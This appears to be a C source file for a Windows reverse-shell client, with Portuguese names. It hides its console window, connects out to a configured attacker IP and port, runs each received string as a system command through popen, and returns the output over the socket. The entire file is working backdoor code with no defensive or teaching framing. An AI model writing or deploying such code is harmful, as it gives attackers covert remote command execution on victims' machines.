#include "client.h"

char* executar_comando(char* command);

int main(){
    // FreeConsole();

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    WSADATA wsa_data;
    int iResult = WSAStartup(MAKEWORD(2,2), &wsa_data);

    int meusocket,x,conecta;
    char buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    client_addr.sin_port = htons(PORT);
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr(IP);

    meusocket = socket(AF_INET,SOCK_STREAM,0);
    printf("[+]Iniciando socket!\n");
    if (meusocket == INVALID_SOCKET){
        WSACleanup();
        perror("[-]socket() failed\n");
    }

    if(conecta = connect(meusocket, (struct sockaddr *)&client_addr, sizeof client_addr) == -1){
        WSACleanup();
        closesocket(meusocket);
        perror("[-]connect() failed\n");
        return 0;
    } else {
        printf("[+]Conectado ao servidor - %s:%d\n",IP,PORT);
    }
    
    while(1){
        memset(&buffer, 0x0, BUFFER_SIZE);
        if(x = recv(meusocket, buffer, sizeof buffer, 0) > 0){
            puts(buffer);
            if(!strcmp(buffer,"")){
                continue;
            } else if (!strcmp(buffer,"\n")){
                continue;
            } else if (!strcmp(buffer,"\t\n")){
                continue;
            }
            if(!strcmp(buffer,"exit\n")){
                WSACleanup();
                closesocket(meusocket);
                return 0;
            } else {
                char* output_command = executar_comando(buffer);
                puts(output_command);
                if(send(meusocket, output_command, (int)strlen(output_command), 0) == SOCKET_ERROR){
                    WSACleanup();
                    closesocket(meusocket);
                    perror("[-]send() failed\n");
                    return 0;
                }
                free(output_command);
            }
        } else {
            WSACleanup();
            closesocket(meusocket);
            return 0;
        }
    }

}

char* executar_comando(char* command){
    FILE *fp;
    char *output_command = malloc(BUFFER_SIZE);
    fp = popen(command, "r");
    if(!fp){
        return "error";
    }
    while(!feof(fp)){
        fscanf(fp,"%[^\0]s\n",output_command);
    }
    if(!strcmp(output_command,"")){
        return "error"; 
    } else if(!strcmp(output_command, " ")){
        return "error";
    }
    fclose(fp);
    strncat(output_command,"\n",2);
    return output_command;
}
